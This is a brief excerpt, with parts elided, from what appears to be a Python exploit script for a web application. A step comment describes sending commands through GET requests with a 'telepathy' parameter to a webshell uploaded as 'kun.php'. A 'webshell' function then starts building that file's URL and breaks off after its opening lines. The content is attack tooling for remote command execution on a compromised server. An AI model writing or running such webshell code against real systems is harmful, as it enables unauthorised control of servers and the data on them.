...
#   7. Communicate with the webshell at '/upload.php?id=kun' using GET Requests with the telepathy parameter.
...
def webshell(SERVER_URL, session):
    try:
        WEB_SHELL = SERVER_URL+'upload/kun.php'
